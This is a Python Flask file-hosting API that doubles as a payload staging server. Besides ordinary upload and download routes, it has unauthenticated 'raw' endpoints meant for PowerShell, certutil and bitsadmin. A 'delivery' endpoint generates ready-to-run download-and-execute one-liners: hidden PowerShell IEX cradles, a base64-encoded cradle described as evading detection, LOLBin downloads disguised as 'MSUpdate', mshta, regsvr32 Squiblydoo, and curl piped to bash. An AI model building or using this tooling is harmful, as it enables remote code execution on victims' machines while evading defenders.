import os
import base64
import hashlib
import uuid
from flask import Blueprint, request, jsonify, send_from_directory, send_file, current_app
from flask_jwt_extended import jwt_required, get_jwt_identity, get_jwt
from werkzeug.utils import secure_filename
from models import db, File, AuditLog

files_bp = Blueprint('files', __name__, url_prefix='/api/files')


def _allowed(filename, allowed):
    return '.' in filename and filename.rsplit('.', 1)[1].lower() in allowed


def _sha256(filepath):
    h = hashlib.sha256()
    with open(filepath, 'rb') as f:
        for chunk in iter(lambda: f.read(65536), b''):
            h.update(chunk)
    return h.hexdigest()


def _log(user_id, action, target=None, details=None, ip=None):
    entry = AuditLog(user_id=user_id, action=action, target=target,
                     details=details, ip_address=ip)
    db.session.add(entry)
    db.session.commit()


@files_bp.route('', methods=['GET'])
@jwt_required()
def list_files():
    user_id = int(get_jwt_identity())
    role = get_jwt().get('role')

    page = request.args.get('page', 1, type=int)
    per_page = min(request.args.get('per_page', 20, type=int), 100)

    if role == 'admin':
        query = File.query
    else:
        query = File.query.filter(
            (File.uploaded_by == user_id) | (File.is_public.is_(True))
        )

    pagination = query.order_by(File.upload_date.desc()).paginate(
        page=page, per_page=per_page, error_out=False
    )
    return jsonify({
        "files": [f.to_dict() for f in pagination.items],
        "total": pagination.total,
        "pages": pagination.pages,
        "current_page": page,
    }), 200


@files_bp.route('/upload', methods=['POST'])
@jwt_required()
def upload_file():
    user_id = int(get_jwt_identity())
    allowed = current_app.config.get('ALLOWED_EXTENSIONS', set())

    if 'file' not in request.files:
        return jsonify({"error": "No file part"}), 400

    file = request.files['file']
    if not file.filename:
        return jsonify({"error": "No selected file"}), 400
    if not _allowed(file.filename, allowed):
        return jsonify({"error": "File type not allowed"}), 400

    original_filename = file.filename
    safe_name = secure_filename(original_filename)
    unique_filename = f"{uuid.uuid4().hex}_{safe_name}"

    upload_folder = current_app.config['UPLOAD_FOLDER']
    os.makedirs(upload_folder, exist_ok=True)
    file_path = os.path.join(upload_folder, unique_filename)
    file.save(file_path)

    file_hash = _sha256(file_path)
    file_size = os.path.getsize(file_path)

    # Deduplicate by SHA-256
    existing = File.query.filter_by(file_hash_sha256=file_hash).first()
    if existing:
        os.remove(file_path)
        return jsonify({"message": "File already exists", "file": existing.to_dict()}), 200

    description = request.form.get('description', '')
    tags = request.form.get('tags', '')
    is_public = request.form.get('is_public', 'false').lower() == 'true'

    db_file = File(
        filename=unique_filename,
        original_filename=original_filename,
        file_hash_sha256=file_hash,
        file_size=file_size,
        description=description,
        tags=tags,
        is_public=is_public,
        uploaded_by=user_id,
    )
    db.session.add(db_file)
    db.session.commit()

    _log(user_id, 'upload', target=original_filename,
         details=f"SHA256: {file_hash}", ip=request.remote_addr)
    return jsonify({"message": "File uploaded successfully", "file": db_file.to_dict()}), 201


@files_bp.route('/<int:file_id>', methods=['GET'])
@jwt_required()
def get_file_info(file_id):
    user_id = int(get_jwt_identity())
    role = get_jwt().get('role')

    db_file = db.get_or_404(File, file_id)
    if role != 'admin' and db_file.uploaded_by != user_id and not db_file.is_public:
        return jsonify({"error": "Access denied"}), 403

    return jsonify(db_file.to_dict()), 200


@files_bp.route('/<int:file_id>/download', methods=['GET'])
@jwt_required()
def download_file(file_id):
    user_id = int(get_jwt_identity())
    role = get_jwt().get('role')

    db_file = db.get_or_404(File, file_id)
    if role != 'admin' and db_file.uploaded_by != user_id and not db_file.is_public:
        return jsonify({"error": "Access denied"}), 403

    db_file.download_count += 1
    db.session.commit()

    _log(user_id, 'download', target=db_file.original_filename, ip=request.remote_addr)
    return send_from_directory(
        current_app.config['UPLOAD_FOLDER'],
        db_file.filename,
        as_attachment=True,
        download_name=db_file.original_filename,
    )


@files_bp.route('/<int:file_id>', methods=['PUT'])
@jwt_required()
def update_file(file_id):
    user_id = int(get_jwt_identity())
    role = get_jwt().get('role')

    db_file = db.get_or_404(File, file_id)
    if role != 'admin' and db_file.uploaded_by != user_id:
        return jsonify({"error": "Access denied"}), 403

    data = request.get_json()
    if not data:
        return jsonify({"error": "No data provided"}), 400

    if 'description' in data:
        db_file.description = data['description']
    if 'tags' in data:
        db_file.tags = data['tags']
    if 'is_public' in data and isinstance(data['is_public'], bool):
        db_file.is_public = data['is_public']

    db.session.commit()
    return jsonify(db_file.to_dict()), 200


@files_bp.route('/<int:file_id>', methods=['DELETE'])
@jwt_required()
def delete_file(file_id):
    user_id = int(get_jwt_identity())
    role = get_jwt().get('role')

    db_file = db.get_or_404(File, file_id)
    if role != 'admin' and db_file.uploaded_by != user_id:
        return jsonify({"error": "Access denied"}), 403

    file_path = os.path.join(current_app.config['UPLOAD_FOLDER'], db_file.filename)
    if os.path.exists(file_path):
        os.remove(file_path)

    _log(user_id, 'delete', target=db_file.original_filename, ip=request.remote_addr)
    db.session.delete(db_file)
    db.session.commit()
    return jsonify({"message": "File deleted successfully"}), 200


# ---------------------------------------------------------------------------
# Unauthenticated raw delivery endpoints (public files only)
# ---------------------------------------------------------------------------

@files_bp.route('/<int:file_id>/raw', methods=['GET'])
def serve_raw_file(file_id):
    """Serve the raw file bytes without authentication.
    Only works for files marked as is_public=True.
    Useful as a plain HTTP server that tools like PowerShell, certutil,
    bitsadmin, wget, curl etc. can pull from directly.
    """
    db_file = db.get_or_404(File, file_id)
    if not db_file.is_public:
        return jsonify({"error": "Access denied"}), 403

    _log(None, 'raw_fetch', target=db_file.original_filename, ip=request.remote_addr)

    file_path = os.path.join(current_app.config['UPLOAD_FOLDER'], db_file.filename)
    return send_file(
        file_path,
        as_attachment=False,
        download_name=db_file.original_filename,
    )


@files_bp.route('/hash/<sha256>/raw', methods=['GET'])
def serve_raw_by_hash(sha256):
    """Serve file by SHA-256 hash (public files only).
    Allows referencing payloads by their content hash.
    """
    db_file = File.query.filter_by(file_hash_sha256=sha256.lower()).first_or_404()
    if not db_file.is_public:
        return jsonify({"error": "Access denied"}), 403

    _log(None, 'raw_fetch_by_hash', target=db_file.original_filename, ip=request.remote_addr)

    file_path = os.path.join(current_app.config['UPLOAD_FOLDER'], db_file.filename)
    return send_file(
        file_path,
        as_attachment=False,
        download_name=db_file.original_filename,
    )


# ---------------------------------------------------------------------------
# Payload delivery command generator (authenticated)
# ---------------------------------------------------------------------------

@files_bp.route('/<int:file_id>/delivery', methods=['GET'])
@jwt_required()
def delivery_commands(file_id):
    """Generate ready-to-use payload delivery one-liners for a file.
    Covers the main HTTP-based transfer techniques usable on Windows targets:
      - PowerShell WebClient DownloadString + IEX (in-memory)
      - PowerShell WebClient DownloadFile (to disk)
      - PowerShell Invoke-WebRequest
      - PowerShell Start-BitsTransfer
      - certutil
      - bitsadmin
      - mshta (HTA files)
      - Base64-encoded PS cradle
    Returns JSON with a 'commands' list and the raw_url for the file.
    """
    user_id = int(get_jwt_identity())
    role = get_jwt().get('role')

    db_file = db.get_or_404(File, file_id)
    if role != 'admin' and db_file.uploaded_by != user_id and not db_file.is_public:
        return jsonify({"error": "Access denied"}), 403

    # Determine the base URL from the request
    # The frontend passes X-Base-URL header or we derive from request host
    base_url = request.headers.get('X-Base-URL', '').rstrip('/')
    if not base_url:
        scheme = request.headers.get('X-Forwarded-Proto', request.scheme)
        host = request.headers.get('X-Forwarded-Host', request.host)
        base_url = f"{scheme}://{host}"

    raw_url = f"{base_url}/api/files/{file_id}/raw"
    fname = db_file.original_filename
    ext = fname.rsplit('.', 1)[-1].lower() if '.' in fname else ''

    # Output path used in download-to-disk commands
    out_path = f"C:\\Windows\\Temp\\{fname}"

    # ---- build the IEX / in-memory cradle string ----
    iex_cradle = f"IEX (New-Object Net.WebClient).DownloadString('{raw_url}')"

    # ---- base64-encoded version of the IEX cradle ----
    encoded = base64.b64encode(iex_cradle.encode('utf-16-le')).decode()

    commands = [
        {
            "technique": "PowerShell – WebClient DownloadString + IEX (In-Memory)",
            "description": "Downloads and executes the script directly in memory without touching disk.",
            "platform": "Windows",
            "cmd": f"powershell -nop -w hidden -c \"{iex_cradle}\"",
        },
        {
            "technique": "PowerShell – WebClient DownloadFile (To Disk)",
            "description": "Downloads the payload to a local path, then executes it.",
            "platform": "Windows",
            "cmd": f"powershell -nop -w hidden -c \"(New-Object Net.WebClient).DownloadFile('{raw_url}', '{out_path}'); Start-Process '{out_path}'\"",
        },
        {
            "technique": "PowerShell – Invoke-WebRequest (IWR)",
            "description": "Uses Invoke-WebRequest alias 'iwr' to download payload to disk.",
            "platform": "Windows",
            "cmd": f"powershell -nop -w hidden -c \"Invoke-WebRequest -Uri '{raw_url}' -OutFile '{out_path}'; & '{out_path}'\"",
        },
        {
            "technique": "PowerShell – Invoke-Expression via IWR",
            "description": "Fetches script content with IWR and pipes to Invoke-Expression.",
            "platform": "Windows",
            "cmd": f"powershell -nop -w hidden -c \"IEX (Invoke-WebRequest -Uri '{raw_url}' -UseBasicParsing).Content\"",
        },
        {
            "technique": "PowerShell – Start-BitsTransfer",
            "description": "Uses Background Intelligent Transfer Service (BITS) to download the file.",
            "platform": "Windows",
            "cmd": f"powershell -nop -w hidden -c \"Start-BitsTransfer -Source '{raw_url}' -Destination '{out_path}'\"",
        },
        {
            "technique": "PowerShell – Base64-Encoded Cradle",
            "description": "Encodes the IEX cradle as UTF-16LE Base64 to evade simple string detection.",
            "platform": "Windows",
            "cmd": f"powershell -nop -w hidden -enc {encoded}",
        },
        {
            "technique": "certutil (LOLBING)",
            "description": "Uses the built-in certutil binary to download the payload to disk.",
            "platform": "Windows",
            "cmd": f"certutil -urlcache -split -f \"{raw_url}\" \"{out_path}\"",
        },
        {
            "technique": "bitsadmin (LOLBING)",
            "description": "Uses the built-in bitsadmin binary (Background Intelligent Transfer Service).",
            "platform": "Windows",
            "cmd": f"bitsadmin /transfer MSUpdate /download /priority high \"{raw_url}\" \"{out_path}\"",
        },
        {
            "technique": "wget / curl (Linux / macOS)",
            "description": "Direct HTTP download using wget or curl on *nix systems.",
            "platform": "Linux/macOS",
            "cmd": f"wget -q -O /tmp/{fname} '{raw_url}' && chmod +x /tmp/{fname} && /tmp/{fname}",
        },
        {
            "technique": "curl (Linux / macOS – pipe to shell)",
            "description": "Fetches and pipes a shell script directly to bash (in-memory equivalent).",
            "platform": "Linux/macOS",
            "cmd": f"curl -sSL '{raw_url}' | bash",
        },
    ]

    # Add mshta technique only for HTA files
    if ext == 'hta':
        commands.append({
            "technique": "mshta (HTA execution)",
            "description": "Runs an HTA payload directly from URL using the Microsoft HTML Application Host.",
            "platform": "Windows",
            "cmd": f"mshta \"{raw_url}\"",
        })

    # Add regsvr32 / SCT technique for SCT/XML scripts
    if ext in ('sct', 'xml'):
        commands.append({
            "technique": "regsvr32 – Squiblydoo (SCT/COM Scriptlet)",
            "description": "Uses regsvr32 to execute a remote COM scriptlet without registration.",
            "platform": "Windows",
            "cmd": f"regsvr32 /s /n /u /i:\"{raw_url}\" scrobj.dll",
        })

    # Warn if file is not public (commands will return 403)
    warning = None if db_file.is_public else (
        "File is NOT public. Set is_public=true to allow unauthenticated raw delivery."
    )

    return jsonify({
        "file_id": file_id,
        "filename": fname,
        "sha256": db_file.file_hash_sha256,
        "raw_url": raw_url,
        "is_public": db_file.is_public,
        "warning": warning,
        "commands": commands,
    }), 200
